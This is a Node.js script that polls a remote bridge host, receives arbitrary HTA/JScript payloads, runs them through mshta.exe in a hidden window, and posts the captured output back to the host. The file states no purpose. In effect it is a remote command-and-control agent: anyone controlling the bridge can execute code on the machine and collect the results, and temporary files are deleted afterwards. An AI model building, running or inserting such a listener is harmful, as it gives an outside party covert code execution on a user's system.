const fs = require("fs");
const os = require("os");
const path = require("path");
const {
  spawnSync
} = require("child_process");
const {
  randomUUID
} = require("crypto");

const BRIDGE = process.env.BRIDGE || "https://bridge.smokestack.workers.dev";
const IDLE_TIMEOUT_MS = 15 * 60 * 1000;

function quoteJScript(value) {
  return JSON.stringify(String(value)).replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029");
}

function instrumentHta(source, outputPath) {
  if (!/<hta:application\b/i.test(source)) {
    throw new Error("Payload must be a complete HTA document containing <hta:application>.");
  }

  const prelude = `<script language="JScript">
var __bridgeOutput = [];
var console = {
  log: function () {
    var values = [];
    for (var i = 0; i < arguments.length; i++) values.push(String(arguments[i]));
    __bridgeOutput.push(values.join(" "));
  }
};
window.onerror = function (message, url, line) {
  __bridgeOutput.push(String(message) + " at line " + line);
  return true;
};
<\/script>`;

  const epilogue = `<script language="JScript">
(function () {
  try {
    var fileSystem = new ActiveXObject("Scripting.FileSystemObject");
    var file = fileSystem.CreateTextFile(${quoteJScript(outputPath)}, true, true);
    file.Write(__bridgeOutput.join("\\r\\n"));
    file.Close();
  } finally {
    window.close();
  }
})();
<\/script>`;

  let instrumented = source.replace(/(<head\b[^>]*>)/i, `$1\n${prelude}`);
  if (instrumented === source) {
    instrumented = prelude + "\n" + source;
  }
  return /<\/body\s*>/i.test(instrumented) ?
    instrumented.replace(/<\/body\s*>/i, `${epilogue}\n</body>`) :
    instrumented + "\n" + epilogue;
}

function runScript(source) {
  const id = randomUUID();
  const scriptPath = path.join(os.tmpdir(), `script-${id}.hta`);
  const outputPath = path.join(os.tmpdir(), `script-${id}.txt`);

  try {
    fs.writeFileSync(scriptPath, instrumentHta(source, outputPath), "utf8");
    const result = spawnSync("mshta.exe", [scriptPath], {
      encoding: "utf8",
      timeout: 60_000,
      windowsHide: true
    });

    if (result.error) {
      throw result.error;
    }
    if (!fs.existsSync(outputPath)) {
      throw new Error(`mshta.exe exited with ${result.status} without producing output`);
    }
    return fs.readFileSync(outputPath, "utf16le");
  } catch (error) {
    return String(error);
  } finally {
    fs.rmSync(scriptPath, {
      force: true
    });
    fs.rmSync(outputPath, {
      force: true
    });
  }
}

async function httpRequest(method, pathname, body) {
  const response = await fetch(`${BRIDGE}${pathname}`, {
    method,
    headers: body === undefined ? undefined : {
      "Content-Type": "application/json"
    },
    body: body === undefined ? undefined : JSON.stringify(body)
  });
  const text = await response.text();
  if (!response.ok) {
    throw new Error(`Bridge returned HTTP ${response.status}: ${text}`);
  }
  return text;
}

async function listen() {
  let lastRequest = Date.now();
  while (Date.now() <= lastRequest + IDLE_TIMEOUT_MS) {
    try {
      const item = JSON.parse(await httpRequest("GET", "/listen/mshta"));
      console.log("received", item.transaction_id);
      const response = {
        transaction_id: item.transaction_id,
        response: runScript(item.payload)
      };
      await httpRequest("POST", "/response", [response]);
      console.log("response sent successfully for", item.transaction_id);
      lastRequest = Date.now();
    } catch (error) {
      console.warn("waiter:", error);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
  console.log("No requests received for 15 minutes; stopping waiter.");
}

listen().catch(error => {
  console.error(error);
  process.exitCode = 1;
});
